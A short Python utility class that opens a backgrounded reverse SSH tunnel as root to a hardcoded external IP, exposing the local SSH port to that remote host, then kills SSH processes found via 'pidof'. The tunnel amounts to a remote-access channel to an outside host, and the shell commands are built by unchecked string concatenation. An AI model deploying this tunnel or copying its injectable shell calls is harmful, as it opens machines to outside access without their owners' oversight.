from subprocess import *
import os
class ssh():
	@staticmethod
	def reverseSShinit(port):
		os.system("ssh -N -R 42:localhost:22 -p "+port+" root@149.255.96.181 -f")	

	@staticmethod
	def reverseSShend():
		#pid = os.system("pidof ssh")
		
		pipe = Popen("pidof ssh", shell=True, stdout=PIPE).stdout
		output = pipe.read()

		os.system("kill "+str(output))
		
